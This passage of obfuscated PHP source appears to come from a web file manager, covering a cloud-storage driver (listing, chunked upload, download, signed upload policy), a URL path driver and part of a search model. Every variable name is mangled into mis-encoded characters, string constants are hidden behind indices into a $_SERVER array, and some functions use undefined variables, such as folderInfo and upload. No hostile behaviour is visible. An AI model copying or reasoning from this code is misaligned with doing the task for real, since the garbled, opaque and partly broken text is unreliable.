$È¿Â‹Ïä[$‹‡¨¥½è[1266]] ? !0 : !1; } public function delFolder($•ÈÎÉôè) { $ãäıÍ§Û =& $_SERVER[³à¼î¯á]; if (!$this->exist($•ÈÎÉôè)) { return !0; } $this->listItemCache = !1; $ˆó—±ƒÌ = $½­ƒö×Ü = array(); $this->fileList($•ÈÎÉôè, $ˆó—±ƒÌ, $½­ƒö×Ü, !0); $this->listItemCache = !0; foreach ($½­ƒö×Ü as $¶€ÍÅÃ—) { $íÚ×Üì‹ = $this->ussRequest($¶€ÍÅÃ—[$ãäıÍ§Û[32]], $ãäıÍ§Û[1552]); if (!$íÚ×Üì‹[$ãäıÍ§Û[1266]]) { return !1; } } foreach ($ˆó—±ƒÌ as $™¥¾¿–Æ) { $íÚ×Üì‹ = $this->ussRequest($™¥¾¿–Æ, $ãäıÍ§Û[1552]); if (!$íÚ×Üì‹[$ãäıÍ§Û[1266]]) { return !1; } } $íÚ×Üì‹ = $this->ussRequest($•ÈÎÉôè, $ãäıÍ§Û[1552]); return $íÚ×Üì‹[$ãäıÍ§Û[1266]]; } public function rename($Æøì–©õ, $¾¤¢‚¿Ö) { if ($this->isFile($Æøì–©õ)) { $¾¤¢‚¿Ö = get_path_father($Æøì–©õ) . $¾¤¢‚¿Ö; return $this->moveFile($Æøì–©õ, $¾¤¢‚¿Ö); } return $this->renameObject($Æøì–©õ, $¾¤¢‚¿Ö); } public function fileInfo($ÔóüƒÎÊ, $…’ı–ã = false, $¾ ‹Ïİ = array()) { $‰šú±»È =& $_SERVER[³à¼î¯á]; $ˆ¦¯³Ë„ = array($‰šú±»È[32] => $this->pathThis($ÔóüƒÎÊ), $‰šú±»È[87] => $this->getPathOuter($‰šú±»È[8] . $ÔóüƒÎÊ), $‰šú±»È[33] => $‰šú±»È[221], $‰šú±»È[79] => isset($¾ ‹Ïİ[$‰šú±»È[79]]) ? $¾ ‹Ïİ[$‰šú±»È[79]] : 0, $‰šú±»È[178] => $this->ext($ÔóüƒÎÊ)); if ($…’ı–ã) { return $ˆ¦¯³Ë„; } $ˆ¦¯³Ë„[$‰šú±»È[222]] = $ˆ¦¯³Ë„[$‰šú±»È[88]] = 0; $ˆ¦¯³Ë„[$‰šú±»È[223]] = $ˆ¦¯³Ë„[$‰šú±»È[224]] = !0; if (empty($¾ ‹Ïİ)) { $¾ ‹Ïİ = $this->objectMeta($ÔóüƒÎÊ); if (!$¾ ‹Ïİ) { return $ˆ¦¯³Ë„; } } $ˆ¦¯³Ë„[$‰šú±»È[222]] = intval($¾ ‹Ïİ[$‰šú±»È[1553]]); $ˆ¦¯³Ë„[$‰šú±»È[88]] = intval($¾ ‹Ïİ[$‰šú±»È[1554]]); $ˆ¦¯³Ë„[$‰šú±»È[79]] = $¾ ‹Ïİ[$‰šú±»È[79]]; return $ˆ¦¯³Ë„; } public function folderInfo($ÕèÕ‡§ø, $èÏÀ³­ = false) { $Ñ²í†Ã× =& $_SERVER[³à¼î¯á]; $ßÄáùŠÈ = array($Ñ²í†Ã×[32] => $this->pathThis($ÕèÕ‡§ø), $Ñ²í†Ã×[87] => $this->getPathOuter($Ñ²í†Ã×[8] . $ÕèÕ‡§ø), $Ñ²í†Ã×[33] => $Ñ²í†Ã×[78]); if ($èÏÀ³­) { return $ßÄáùŠÈ; } $ßÄáùŠÈ[$Ñ²í†Ã×[222]] = $ßÄáùŠÈ[$Ñ²í†Ã×[88]] = 0; $ßÄáùŠÈ[$Ñ²í†Ã×[223]] = $ßÄáùŠÈ[$Ñ²í†Ã×[224]] = !0; if (empty($Î¡ùì)) { $Î¡ùì = $this->objectMeta($ÕèÕ‡§ø); if (!$Î¡ùì) { return $ßÄáùŠÈ; } } $ßÄáùŠÈ[$Ñ²í†Ã×[222]] = intval($Î¡ùì[$Ñ²í†Ã×[1553]]); $ßÄáùŠÈ[$Ñ²í†Ã×[88]] = intval($Î¡ùì[$Ñ²í†Ã×[1554]]); return $ßÄáùŠÈ; } private function listObjs($Ïú×ÈßÕ, $ÏËŒ¶ç§ = 0, $§…ò¥óØ = 1000) { $íğèÜ‡ =& $_SERVER[³à¼î¯á]; $±’ò¬´Ç = array($íğèÜ‡[1555], $íğèÜ‡[1556] . $§…ò¥óØ); if ($ÏËŒ¶ç§) { $±’ò¬´Ç[] = $íğèÜ‡[1557] . $ÏËŒ¶ç§; } $·ìèÒÆ’ = $this->ussRequest($Ïú×ÈßÕ, $íğèÜ‡[252], !1, $±’ò¬´Ç); return !$·ìèÒÆ’[$íğèÜ‡[1266]] ? !1 : $·ìèÒÆ’[$íğèÜ‡[1256]]; } private function fileList($İıúò®â, &$ÕÍ×©¡±, &$—á¾Õ…¬, $ã¹Ñ‰¥ = false) { $¥¤Áı§¨ =& $_SERVER[³à¼î¯á]; $¤ˆÜ™‚© = $¥¤Áı§¨[12]; $â¬ìœ—ğ = 1000; $á˜÷Åùè = rtrim($İıúò®â, $¥¤Áı§¨[8]) . $¥¤Áı§¨[8]; while (!0) { check_abort(); $„áŞ¾şõ = $this->listObjs($İıúò®â, $¤ˆÜ™‚©, $â¬ìœ—ğ); if (!$„áŞ¾şõ) { return !1; } $¤ˆÜ™‚© = isset($„áŞ¾şõ[$¥¤Áı§¨[1558]]) ? $„áŞ¾şõ[$¥¤Áı§¨[1558]] : $¥¤Áı§¨[12]; $ß€™Ÿı = isset($„áŞ¾şõ[$¥¤Áı§¨[1559]]) ? $„áŞ¾şõ[$¥¤Áı§¨[1559]] : array(); foreach ($ß€™Ÿı as $„üçè´) { $®ñº¶´ = $„üçè´[$¥¤Áı§¨[33]] == $¥¤Áı§¨[78] ? !0 : !1; $‡Ø‰¸©ç = ltrim($á˜÷Åùè . $„üçè´[$¥¤Áı§¨[32]], $¥¤Áı§¨[8]) . ($®ñº¶´ ? $¥¤Áı§¨[8] : $¥¤Áı§¨[12]); $ÅäÉ¹Ù = array($¥¤Áı§¨[32] => $‡Ø‰¸©ç, $¥¤Áı§¨[33] => $®ñº¶´ ? $¥¤Áı§¨[78] : $¥¤Áı§¨[221], $¥¤Áı§¨[79] => $„üçè´[$¥¤Áı§¨[388]], $¥¤Áı§¨[1554] => $„üçè´[$¥¤Áı§¨[1560]]); $this->cacheMethodInfoSet($‡Ø‰¸©ç, $®ñº¶´, $ÅäÉ¹Ù); if ($®ñº¶´) { $ÕÍ×©¡±[] = $‡Ø‰¸©ç; if ($ã¹Ñ‰¥) { $this->fileList($‡Ø‰¸©ç, $ÕÍ×©¡±, $—á¾Õ…¬, $ã¹Ñ‰¥); } continue; } $—á¾Õ…¬[] = $ÅäÉ¹Ù; } if (count($ß€™Ÿı) < $â¬ìœ—ğ) { break; } } $this->cacheMethodInfoSet($İıúò®â, !0); } public function listPath($ö£Õ—, $Ñ‰öÉï = false) { $òÜĞöÚÙ =& $_SERVER[³à¼î¯á]; $ˆ¬Ôî²ğ = $ì‘ØÆ³ù = array(); $this->fileList($ö£Õ—, $ˆ¬Ôî²ğ, $ì‘ØÆ³ù); foreach ($ˆ¬Ôî²ğ as $Ğ¹ÁÀû• => $õŒ•³â) { $ˆ¬Ôî²ğ[$Ğ¹ÁÀû•] = $this->folderInfo($õŒ•³â, $Ñ‰öÉï); } foreach ($ì‘ØÆ³ù as $Ğ¹ÁÀû• => $õŒ•³â) { $ì‘ØÆ³ù[$Ğ¹ÁÀû•] = $this->fileInfo($õŒ•³â[$òÜĞöÚÙ[32]], $Ñ‰öÉï, $õŒ•³â); } return array($òÜĞöÚÙ[85] => $ˆ¬Ôî²ğ, $òÜĞöÚÙ[86] => $ì‘ØÆ³ù); } public function has($Èı‚¥ïÎ, $‘Çó°¸À = false, $üµñ¢Ø– = true) { $Ì»ˆ÷ÃÇ =& $_SERVER[³à¼î¯á]; $ÚÜº¹™Ë = $Ì»ˆ÷ÃÇ[12]; $µ»™Øè = 500; $÷êĞí‘ë = 0; $ç˜ÆéØş = 0; $›üôƒÇ = rtrim($Èı‚¥ïÎ, $Ì»ˆ÷ÃÇ[8]) . $Ì»ˆ÷ÃÇ[8]; while (!0) { check_abort(); $óÔÛı¢˜ = $this->listObjs($Èı‚¥ïÎ, $ÚÜº¹™Ë, $µ»™Øè); if (!$óÔÛı¢˜) { return !1; } $ÚÜº¹™Ë = isset($óÔÛı¢˜[$Ì»ˆ÷ÃÇ[1558]]) ? $óÔÛı¢˜[$Ì»ˆ÷ÃÇ[1558]] : $Ì»ˆ÷ÃÇ[12]; $â–™ì°ş = isset($óÔÛı¢˜[$Ì»ˆ÷ÃÇ[1559]]) ? $óÔÛı¢˜[$Ì»ˆ÷ÃÇ[1559]] : array(); if (empty($â–™ì°ş)) { break; } $•å¥í‰Ä = array_filter($â–™ì°ş, function ($«û²Êş‚) { $•¿ŠşŸì =& $_SERVER[³à¼î¯á]; return $«û²Êş‚[$•¿ŠşŸì[33]] == $•¿ŠşŸì[78]; }); $¾îöÂ«˜ = count($â–™ì°ş); $•å¥í‰Ä = count($•å¥í‰Ä); $ ¤¼ôÌ­ = $¾îöÂ«˜ - $•å¥í‰Ä; if ($‘Çó°¸À) { $ç˜ÆéØş += $•å¥í‰Ä; $÷êĞí‘ë += $ ¤¼ôÌ­; if ($¾îöÂ«˜ < $µ»™Øè) { break; } continue; } if ($üµñ¢Ø–) { if ($ ¤¼ôÌ­) { return !0; } } else { if ($•å¥í‰Ä) { return !0; } } if ($¾îöÂ«˜ < $µ»™Øè) { break; } } if ($‘Çó°¸À) { return array($Ì»ˆ÷ÃÇ[230] => $÷êĞí‘ë, $Ì»ˆ÷ÃÇ[231] => $ç˜ÆéØş); } return !1; } public function listAll($ÙÌÃø÷£) { $‡œñ´ =& $_SERVER[³à¼î¯á]; $µ‡ì°”µ = $¢ûÆ¤›ï = array(); $this->fileList($ÙÌÃø÷£, $µ‡ì°”µ, $¢ûÆ¤›ï, !0); $—…şîÒî = array_to_keyvalue($¢ûÆ¤›ï, $‡œñ´[32]); foreach ($µ‡ì°”µ as $ÈîÀò†—) { if (is_string($ÈîÀò†—)) { $—…şîÒî[$ÈîÀò†—] = array($‡œñ´[79] => 0); } } return $this->listAllFiles($ÙÌÃø÷£, $—…şîÒî); } public function canRead($úŞˆäÇÎ) { return $this->exist($úŞˆäÇÎ) ? !0 : !1; } public function canWrite($©Ø¾÷È·) { return $this->exist($©Ø¾÷È·) ? !0 : !1; } public function getContent($§¹æ‘º) { return $this->fileSubstr($§¹æ‘º, 0, -1); } public function setContent($Ãù©â­³, $—·‡•Ù± = '') { $¦³ŞÊ«Ø =& $_SERVER[³à¼î¯á]; if (!$—·‡•Ù±) { $è¿„¾ëŸ = $this->ussRequest($Ãù©â­³, $¦³ŞÊ«Ø[248]); return $è¿„¾ëŸ[$¦³ŞÊ«Ø[1266]]; } $úĞ™´ñı = $this->tempFile($this->pathThis($Ãù©â­³)); file_put_contents($úĞ™´ñı, $—·‡•Ù±); if ($this->upload($Ãù©â­³, $úĞ™´ñı)) { $this->tempFileRemve($úĞ™´ñı); return !0; } return !1; } public function fileSubstr($†œ¨ŠŞÎ, $ÑÖ¶ëôÎ, $ú¥ì«²) { $İÉ—õ²± =& $_SERVER[³à¼î¯á]; if (!($ºÁ¾èŞÑ = $this->link($†œ¨ŠŞÎ))) { return !1; } $Ğ…¯š¬ = !1; if ($ú¥ì«² > 0) { $Ü¬ç²Ò¥ = $ÑÖ¶ëôÎ + $ú¥ì«² - 1; $Ğ…¯š¬ = array($İÉ—õ²±[1508] . $ÑÖ¶ëôÎ . $İÉ—õ²±[437] . $Ü¬ç²Ò¥); } $¤ÎâÎçÛ = url_request($ºÁ¾èŞÑ, $İÉ—õ²±[252], !1, $Ğ…¯š¬); return $¤ÎâÎçÛ[$İÉ—õ²±[795]] ? $¤ÎâÎçÛ[$İÉ—õ²±[1256]] : !1; } public function upload($Ğ¨‘§£Ç, $±ã×’, $è°†ÎÕõ = false, $‡„½‹¿¥ = REPEAT_REPLACE) { $Šõä­’¥ =& $_SERVER[³à¼î¯á]; $É×óøÖƒ = IO::size($±ã×’); if ($É×óøÖƒ <= 1024 * 1024 * 200) { $ÂŸòşı = array($Šõä­’¥[1561] . $±ã×’); $÷§ºşƒ = $this->ussRequest($Ğ¨‘§£Ç, $Šõä­’¥[250], $ÂŸòşı); return $÷§ºşƒ[$Šõä­’¥[1266]] ? $this->getPathOuter($Ğ¨‘§£Ç) : !1; } $ö…¼Ä×÷ = 1024 * 1024 * 10; $Ëò“É¹ = array($Šõä­’¥[1562], $Šõä­’¥[1563] . $É×óøÖƒ, $Šõä­’¥[1564], $Šõä­’¥[1565] . $ö…¼Ä×÷); $÷§ºşƒ = $this->ussRequest($Ğ¨‘§£Ç, $Šõä­’¥[250], !1, $Ëò“É¹); if (!$÷§ºşƒ[$Šõä­’¥[1266]]) { return !1; } $¦ø­° = $÷§ºşƒ[$Šõä­’¥[1256]]; $°é—î—í = 0; $éÖŞ‡‘İ = $¦ø­°[$Šõä­’¥[1566]]; $œı ‹ºÚ = fopen($±ã×’, $Šõä­’¥[1427]); if (!$œı ‹ºÚ) { return !1; } do { $˜®Ø÷„Ï = $¦ø­°[$Šõä­’¥[1567]]; fseek_64($œı ‹ºÚ, $°é—î—í); $ê‡Î¨ƒ¿ = fread($œı ‹ºÚ, $˜®Ø÷„Ï); $Óœòˆä‰ = 0; do { $Óœòˆä‰++; $¦ø­° = $this->uploadPart($Ğ¨‘§£Ç, $¦ø­°, $ê‡Î¨ƒ¿); } while (!$¦ø­° && $Óœòˆä‰ < 3); if (!$¦ø­°) { return !1; } $éÖŞ‡‘İ = $¦ø­°[$Šõä­’¥[1566]]; $°é—î—í += $˜®Ø÷„Ï; } while ($éÖŞ‡‘İ != -1); fclose($œı ‹ºÚ); $Ëò“É¹ = array($Šõä­’¥[1568], $Šõä­’¥[1569] . $¦ø­°[$Šõä­’¥[1570]], $Šõä­’¥[1564]); $÷§ºşƒ = $this->ussRequest($Ğ¨‘§£Ç, $Šõä­’¥[250], !1, $Ëò“É¹); return $÷§ºşƒ[$Šõä­’¥[1266]] ? $this->getPathOuter($ê€°ê÷Œ) : !1; } private function uploadPart($¥ú›²¶š, $”›³ÉÀ, &$ÇöĞô­œ) { $ıé¼ï¢ =& $_SERVER[³à¼î¯á]; $…şÏìÌ® = array($ıé¼ï¢[1571], $ıé¼ï¢[1569] . $”›³ÉÀ[$ıé¼ï¢[1570]], $ıé¼ï¢[1572] . $”›³ÉÀ[$ıé¼ï¢[1566]], $ıé¼ï¢[146] . $”›³ÉÀ[$ıé¼ï¢[1567]]); $»ÛŸ—³ = $this->ussRequest($¥ú›²¶š, $ıé¼ï¢[250], $ÇöĞô­œ, $…şÏìÌ®); return !$»ÛŸ—³[$ıé¼ï¢[1266]] ? $»ÛŸ—³[$ıé¼ï¢[1266]] : $»ÛŸ—³[$ıé¼ï¢[1256]]; } public function uploadFormData($ÇøÃ–À¶, $¿Õƒüİô = 3600) { return $this->uploadPolicy($ÇøÃ–À¶, $¿Õƒüİô); } public function multiUploadFormData($ÙùƒĞª†, $Åˆ‘ûÀ = 3600) { $‹¡‘¢ª“ =& $_SERVER[³à¼î¯á]; $ÔŸÕÖ = (int) $GLOBALS[$‹¡‘¢ª“[7]][$‹¡‘¢ª“[79]]; return $this->uploadPolicy($ÙùƒĞª†, $Åˆ‘ûÀ, $ÔŸÕÖ); } private function uploadPolicy($¦úŸ³ª, $©õÀÛ¾´ = 3600, $ñóô²æˆ = 0) { $ëØ÷ŸÉß =& $_SERVER[³à¼î¯á]; $ÔØşÉÙ× = $ëØ÷ŸÉß[8] . $this->bucket; $şŠÍòğÂ = gmdate($ëØ÷ŸÉß[1466]); $¥Ş‹µÕ« = array($ëØ÷ŸÉß[1573] => $this->bucket, $ëØ÷ŸÉß[1574] => $¦úŸ³ª, $ëØ÷ŸÉß[1575] => time() + $©õÀÛ¾´, $ëØ÷ŸÉß[1576] => $şŠÍòğÂ); if ($ñóô²æˆ) { $¥Ş‹µÕ«[$ëØ÷ŸÉß[1447]] = $ñóô²æˆ; } $¨ÚèËĞ‚ = base64_encode(json_encode($¥Ş‹µÕ«)); $‚úü×•ô = base64_encode(hash_hmac($ëØ÷ŸÉß[1530], "\x50\x4f\123\124\x26{$ÔØşÉÙ×}\46{$şŠÍòğÂ}\46{$¨ÚèËĞ‚}", md5("{$this->userpass}"), !0)); $Í‚Îğæ = array($ëØ÷ŸÉß[284] => $¨ÚèËĞ‚, $ëØ÷ŸÉß[1577] => "\125\120\131\125\116\40{$this->username}\x3a{$‚úü×•ô}", $ëØ÷ŸÉß[199] => $this->endpoint . $ÔØşÉÙ×); return $Í‚Îğæ; } public function download($ïÂˆßøÚ, $¾ÃöşŠ) { $Ä®­…ëØ = IO::getPathInner(IO::mkfile($¾ÃöşŠ)); if (!($î…£Š˜° = $this->link($ïÂˆßøÚ))) { return !1; } $¿ıÅØÚ = 0; $ˆ…£ƒöÚ = 1024 * 200; $Àï£¹øş = fopen($Ä®­…ëØ, $_SERVER[³à¼î¯á][1514]); while (!0) { $š¸ò—õÁ = $this->fileSubstr($ïÂˆßøÚ, $¿ıÅØÚ, $ˆ…£ƒöÚ); if ($š¸ò—õÁ === !1) { return !1; } fwrite($Àï£¹øş, $š¸ò—õÁ); $¿ıÅØÚ += $ˆ…£ƒöÚ; if (strlen($š¸ò—õÁ) < $ˆ…£ƒöÚ) { break; } } fclose($Àï£¹øş); return $¾ÃöşŠ; } public function link($ê†éÀÕ, $‰¼Ò×Í = array()) { $ˆòÈÌÖÑ =& $_SERVER[³à¼î¯á]; $ê†éÀÕ = trim($ê†éÀÕ, $ˆòÈÌÖÑ[8]); if (!empty($this->token)) { $òÉ¸©èè = strtotime(date($ˆòÈÌÖÑ[1578])); $ç™ç•ËÉ = substr(md5($this->token . $ˆòÈÌÖÑ[335] . $òÉ¸©èè . $ˆòÈÌÖÑ[1579] . $ê†éÀÕ), 12, 8) . $òÉ¸©èè; $‰¼Ò×Í[] = $ˆòÈÌÖÑ[1580] . $ç™ç•ËÉ; } $Ÿ¨ÀÂ·¸ = !empty($‰¼Ò×Í) ? $ˆòÈÌÖÑ[76] . implode($ˆòÈÌÖÑ[335], $‰¼Ò×Í) : $ˆòÈÌÖÑ[12]; return $this->getHost() . $ˆòÈÌÖÑ[8] . $ê†éÀÕ . $Ÿ¨ÀÂ·¸; } public function fileOut($ÙêŒæ®Ğ, $ËµŞ‚¾ì = false, $½ÚÙ²Â = false, $Èõ…¸ñÍ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ÙêŒæ®Ğ, $ËµŞ‚¾ì, $½ÚÙ²Â, $Èõ…¸ñÍ); } if (!$½ÚÙ²Â) { $½ÚÙ²Â = $this->pathThis($ÙêŒæ®Ğ); } $…É­È‡Ò = $ËµŞ‚¾ì ? array($_SERVER[³à¼î¯á][1581] . rawurlencode($½ÚÙ²Â)) : array(); $·ÇìÂ› = $this->link($ÙêŒæ®Ğ, $…É­È‡Ò); $this->fileOutLink($·ÇìÂ›); } public function fileOutServer($®ºçæø, $Äöëóä² = false, $şîÕ»Ğá = false, $šÚ–æ÷û = '') { parent::fileOut($®ºçæø, $Äöëóä², $şîÕ»Ğá, $šÚ–æ÷û); } public function fileOutImage($šÒ³ÌÍ, $àšîĞÏÌ = 250) { $›á…œ×å = $this->link($šÒ³ÌÍ . $_SERVER[³à¼î¯á][1582] . $àšîĞÏÌ); $this->fileOutLink($›á…œ×å); } public function fileOutImageServer($ç¥ä‡¥”, $ÏÚœì©È = 250) { parent::fileOutImage($ç¥ä‡¥”, $ÏÚœì©È); } public function hashMd5($ÎŒÛ²²ª) { $øŸÃø¡š =& $_SERVER[³à¼î¯á]; $³İó¸ªÄ = $this->_objectMeta($ÎŒÛ²²ª); return isset($³İó¸ªÄ[$øŸÃø¡š[236]]) ? $³İó¸ªÄ[$øŸÃø¡š[236]] : !1; } public function size($áĞÏ€º) { $á‹Æ»‹Î = $this->objectMeta($áĞÏ€º); return $á‹Æ»‹Î ? $á‹Æ»‹Î[$_SERVER[³à¼î¯á][79]] : 0; } public function info($Ô«èü›) { if ($this->isFolder($Ô«èü›)) { return $this->folderInfo($Ô«èü›); } else { if ($this->isFile($Ô«èü›)) { return $this->fileInfo($Ô«èü›); } } return !1; } public function exist($Ğ«”ÃìÒ) { return $this->isFile($Ğ«”ÃìÒ) || $this->isFolder($Ğ«”ÃìÒ); } public function isFile($ªç­§) { return !$this->isFolder($ªç­§) && $this->objectMeta($ªç­§); } public function isFolder($Ø·÷ÁƒŠ) { return $this->cacheMethod($_SERVER[³à¼î¯á][169], $Ø·÷ÁƒŠ); } protected function objectMeta($“‰ìšÑ) { return $this->cacheMethod($_SERVER[³à¼î¯á][171], $“‰ìšÑ); } protected function _objectMeta($·Õü€å©) { $é¸ëŠşÛ =& $_SERVER[³à¼î¯á]; if ($·Õü€å© == $é¸ëŠşÛ[12] || $·Õü€å© == $é¸ëŠşÛ[8]) { return array(); } $×©¼‹…À = $this->ussRequest($·Õü€å©, $é¸ëŠşÛ[1583]); if (!$×©¼‹…À[$é¸ëŠşÛ[1266]]) { return null; } $ªó’èÛØ = isset($×©¼‹…À[$é¸ëŠşÛ[1256]]) ? $×©¼‹…À[$é¸ëŠşÛ[1256]] : array(); if (!isset($ªó’èÛØ[$é¸ëŠşÛ[1584]])) { return null; } $Î¤Ûš°á = array($é¸ëŠşÛ[33] => isset($ªó’èÛØ[$é¸ëŠşÛ[1584]]) ? $ªó’èÛØ[$é¸ëŠşÛ[1584]] : null, $é¸ëŠşÛ[79] => isset($ªó’èÛØ[$é¸ëŠşÛ[1585]]) ? $ªó’èÛØ[$é¸ëŠşÛ[1585]] : null, $é¸ëŠşÛ[236] => isset($ªó’èÛØ[$é¸ëŠşÛ[1586]]) ? $ªó’èÛØ[$é¸ëŠşÛ[1586]] : null, $é¸ëŠşÛ[1553] => isset($ªó’èÛØ[$é¸ëŠşÛ[1587]]) ? $ªó’èÛØ[$é¸ëŠşÛ[1587]] : null); $Î¤Ûš°á[$é¸ëŠşÛ[1554]] = isset($ªó’èÛØ[$é¸ëŠşÛ[1588]]) ? strtotime($ªó’èÛØ[$é¸ëŠşÛ[1588]]) : $Î¤Ûš°á[$é¸ëŠşÛ[1553]]; return $Î¤Ûš°á; } protected function _isFolder($ÈÆŒ¬÷Ä) { $çÊ«Ëì‹ =& $_SERVER[³à¼î¯á]; if ($ÈÆŒ¬÷Ä == $çÊ«Ëì‹[12] || $ÈÆŒ¬÷Ä == $çÊ«Ëì‹[8]) { return !0; } $¹²¦êÑŒ = $this->_objectMeta($ÈÆŒ¬÷Ä); return isset($¹²¦êÑŒ[$çÊ«Ëì‹[33]]) && $¹²¦êÑŒ[$çÊ«Ëì‹[33]] == $çÊ«Ëì‹[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ÙÜ¬Æ’ = false) { } public function exist($â•ÙÇƒ) { $™À§ÅğÃ = $this->info($â•ÙÇƒ); return $™À§ÅğÃ[$_SERVER[³à¼î¯á][223]]; } public function isFile($ˆ‹šïü¥) { $Ò¹ñ ñ© = $this->info($ˆ‹šïü¥); return $Ò¹ñ ñ©[$_SERVER[³à¼î¯á][223]]; } public function isFolder($œĞü“Î) { return !1; } public function size($º¯õ‰Ô·) { $ìßÎ’“ = $this->info($º¯õ‰Ô·); return $ìßÎ’“[$_SERVER[³à¼î¯á][79]]; } public function info($‚šª™ÖŠ) { return $this->infoParse($‚šª™ÖŠ); } public function infoAuth($ÖááüÖ—) { return $this->infoParse($ÖááüÖ—); } public function infoWithChildren($¢Î¦”¾ú) { return $this->infoParse($¢Î¦”¾ú); } public function infoFull($¨²ùÌ‘€) { return $this->infoParse($¨²ùÌ‘€); } private function infoParse($›Û²è­) { $¼¢èÒÛª =& $_SERVER[³à¼î¯á]; $ş™‰×Í¬ = $this->header($›Û²è­); if (!$ş™‰×Í¬ || !$ş™‰×Í¬[$¼¢èÒÛª[795]]) { return !1; } $·ÍŠÜØî = _get($ş™‰×Í¬, $¼¢èÒÛª[388], 0); $È¸àÈŠ‹ = array($¼¢èÒÛª[32] => $ş™‰×Í¬[$¼¢èÒÛª[32]], $¼¢èÒÛª[87] => $›Û²è­, $¼¢èÒÛª[33] => $¼¢èÒÛª[221], $¼¢èÒÛª[79] => intval($·ÍŠÜØî), $¼¢èÒÛª[178] => get_path_ext($ş™‰×Í¬[$¼¢èÒÛª[32]]), $¼¢èÒÛª[1424] => $·ÍŠÜØî > 0 && $ş™‰×Í¬[$¼¢èÒÛª[1589]], $¼¢èÒÛª[1425] => !1); return $È¸àÈŠ‹; } private function header($â©­¹ºî) { $İ‚¾äÆè =& $_SERVER[³à¼î¯á]; if (isset(self::$_cacheHeader[$â©­¹ºî])) { return self::$_cacheHeader[$â©­¹ºî]; } $¬‡·ïÇí = isset($GLOBALS[$İ‚¾äÆè[1590]]) ? $GLOBALS[$İ‚¾äÆè[1590]] : !1; $GLOBALS[$İ‚¾äÆè[1590]] = !0; self::$_cacheHeader[$â©­¹ºî] = url_header($â©­¹ºî); $GLOBALS[$İ‚¾äÆè[1590]] = $¬‡·ïÇí; return self::$_cacheHeader[$â©­¹ºî]; } public function hashSimple($˜••øô“, $¹ĞÎ…ÔÉ = false) { $ÍŠòÔ½¡ =& $_SERVER[³à¼î¯á]; $ñŞ£ĞÔ‘ = $this->info($˜••øô“); if (!$ñŞ£ĞÔ‘ || !$ñŞ£ĞÔ‘[$ÍŠòÔ½¡[223]]) { return !1; } $äœ—–ŒË = $ñŞ£ĞÔ‘[$ÍŠòÔ½¡[79]]; $Ã¹ùõô® = 200; $»Ãë·Š = 50; if ($äœ—–ŒË <= $Ã¹ùõô® * $»Ãë·Š) { return md5($this->fileSubstr($˜••øô“, 0, $äœ—–ŒË)) . $äœ—–ŒË; } $®•¯äŞ® = intval($äœ—–ŒË / $»Ãë·Š); $«™úãö = $ÍŠòÔ½¡[12]; $ä¯ÅÁç = timeFloat(); $Çï³‘à² = 15; for ($à¥š«éä = 0; $à¥š«éä < $»Ãë·Š; $à¥š«éä++) { if (timeFloat() - $ä¯ÅÁç > $Çï³‘à²) { return !1; } $ÍÅá¹Ğé = $this->fileSubstr($˜••øô“, $®•¯äŞ® * $à¥š«éä, $Ã¹ùõô®); if (!$ÍÅá¹Ğé) { return !1; } $«™úãö .= $ÍÅá¹Ğé; } $«™úãö .= $this->fileSubstr($˜••øô“, $äœ—–ŒË - $Ã¹ùõô®, $Ã¹ùõô®); return md5($«™úãö) . $äœ—–ŒË; } public function getContent($Š³İ½Ú) { return $this->fileSubstr($Š³İ½Ú); } public function fileSubstr($’Ç…Ğ®, $ö«úğ¤ = 0, $Ø­¢™ç = -1) { $İ”ãŠ‹ù =& $_SERVER[³à¼î¯á]; $í¬¥¬ÔŠ = $this->info($’Ç…Ğ®); if (!$í¬¥¬ÔŠ || !$í¬¥¬ÔŠ[$İ”ãŠ‹ù[223]] && $í¬¥¬ÔŠ[$İ”ãŠ‹ù[79]] > 1024 * 1024 * 10) { return !1; } if ($Ø­¢™ç === -1) { $Ø­¢™ç = $í¬¥¬ÔŠ[$İ”ãŠ‹ù[79]]; } if ($Ø­¢™ç == 0) { return $İ”ãŠ‹ù[12]; } $ó©·°Ó = array($İ”ãŠ‹ù[1591] . $ö«úğ¤ . $İ”ãŠ‹ù[829] . ($ö«úğ¤ + $Ø­¢™ç - 1)); $„µ©ËêÖ = url_request($’Ç…Ğ®, $İ”ãŠ‹ù[252], !1, $ó©·°Ó, !1, !1, 30); return $„µ©ËêÖ[$İ”ãŠ‹ù[1256]] ? $„µ©ËêÖ[$İ”ãŠ‹ù[1256]] : $İ”ãŠ‹ù[12]; } public function download($£ïá¡³, $ù—Ú‡¡–) { Downloader::start($£ïá¡³, $ù—Ú‡¡–); return $ù—Ú‡¡–; } } goto FİÀÒ‡Ã·Ç; E†³«Ç­äŠ: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($»¢Œ–Ò) { $î×Á¶âŠ =& $_SERVER[³à¼î¯á]; $‰ÍãŸ° = KodIO::fileTypeList(); $œ›É‰Ä¦ = $‰ÍãŸ°[$»¢Œ–Ò]; if (!$œ›É‰Ä¦) { return array(); } $°ŠèÊÔ° = $œ›É‰Ä¦[$î×Á¶âŠ[178]]; $Ïìİ³ª® = $î×Á¶âŠ[7]; if (!$œ›É‰Ä¦[$î×Á¶âŠ[178]]) { $ÄğØÔ­í = array_to_keyvalue($‰ÍãŸ°, $î×Á¶âŠ[12], $î×Á¶âŠ[178]); $°ŠèÊÔ° = implode($î×Á¶âŠ[50], $ÄğØÔ­í); $Ïìİ³ª® = $î×Á¶âŠ[2215]; } $«Æ“ò’Ã = explode($î×Á¶âŠ[50], trim($°ŠèÊÔ°, $î×Á¶âŠ[50])); return array($Ïìİ³ª®, $«Æ“ò’Ã); } public function listPathType($Ç‘Ù°ù†) { $–’Ù´¡ =& $_SERVER[³à¼î¯á]; $†ËÔå³‰ = $this->fileTypeWhere($Ç‘Ù°ù†); if (!$†ËÔå³‰) { return array(); } $’—¬õÒ = USER_ID; $°ÙïŠï = Model($–’Ù´¡[574])->getInfo($’—¬õÒ); $îÓñ´ª = array($–’Ù´¡[623] => SourceModel::TYPE_USER, $–’Ù´¡[560] => array($–’Ù´¡[587], $–’Ù´¡[570] . $°ÙïŠï[$–’Ù´¡[90]][$–’Ù´¡[184]] . $–’Ù´¡[588]), $–’Ù´¡[624] => $’—¬õÒ, $–’Ù´¡[621] => 0, $–’Ù´¡[622] => $†ËÔå³‰); return $this->listSource($îÓñ´ª); } public function listSearch($İ—Úå­Ø, $Å•÷¹÷Ï = 300) { $ÁØû§éë =& $_SERVER[³à¼î¯á]; if 